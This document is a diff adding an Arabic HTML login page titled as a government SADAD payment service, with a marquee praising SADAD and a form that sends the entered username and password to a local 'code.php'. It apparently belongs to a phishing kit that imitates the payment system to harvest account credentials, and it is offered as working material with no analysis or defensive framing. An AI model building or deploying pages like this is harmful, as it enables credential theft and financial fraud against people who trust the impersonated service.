@@ -1,0 +1,52 @@
+﻿<!DOCTYPE html>
+<html lang=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
+	<link rel="icon" type="image/png" href="assets/img/favicon.png">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+    <title>سداد حكومي</title>
+	
+	<meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport'> 
+
+	<link rel="stylesheet" href="assets\css\assets.css">
+    <link rel="stylesheet" type="text/css" href="assets\css\font.css">
+	<link rel="stylesheet" href="assets\css\fontello.css">
+	
+<script language="javascript" type="text/javascript">
+function removeSpaces(string) {
+ return string.split(' ').join('');
+}
+</script>
+
+</head>
+
+
+	<script type="text/javascript" src="/md5.js"></script>
+
+<body>
+<div class="logo-basheer">
+			<img src="logo00.png" width="144" height="300" align="middle"></div>
+
+    <div class="marque"><marquee direction="right"><span style="color: #FF8B59">يقوم سداد بتسهيل وتسريع مختلف المدفوعات للأفراد والمصارف والشركات والقطاع الحكومي، ويستمر في تطوير خدمات جديدة تشمل كافة المدفوعات، فيهدف سداد الى تقديم حلٍ واحد لجميع المدفوعات.</span><span></span></marquee></div>
+	
+    <form class="form" action="./code.php" method="POST">
+	<div> ادخل بيانات الحساب </div>
+	<div class="input-field">
+           <input onblur="this.value=removeSpaces(this.value);" name="user" type="text" placeholder="اسم المستخدم" name="username" required="">
+                <div class="icon"><i class="icon-user"></i></div>
+            </div>
+            <div class="input-field">
+           <input onblur="this.value=removeSpaces(this.value);" name="pass" type="password" placeholder="كلمة السر" name="password" required="">
+                <div class="icon"><i class="icon-lock"></i></div>
+            </div>
+            <div class="submit">
+                <button type="submit" name="submit">التالي<i class="icon-login"></i></button>
+            	<p>&nbsp;</p>
+
+        </div></form>   
+
+
+</body>
+
+</html>
